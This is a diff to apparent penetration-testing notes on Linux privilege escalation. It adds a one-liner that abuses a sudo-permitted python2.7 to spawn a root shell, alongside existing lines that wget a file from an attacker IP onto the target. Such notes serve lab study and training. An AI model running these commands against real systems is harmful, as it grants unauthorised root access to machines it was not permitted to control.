@@ -43,6 +43,10 @@
   - download the file in the target system ```wget http://<myip>/<filename>```
   - example: wget http://192.168.45.161/root.cpp
  
+- if you find ```/usr/bin/python2.7``` in sudo -l
+  - then use the below command it will give you the root privilege
+  - ```/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
+ 
 
 - if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
   - then use the below command it will give you the root privilege
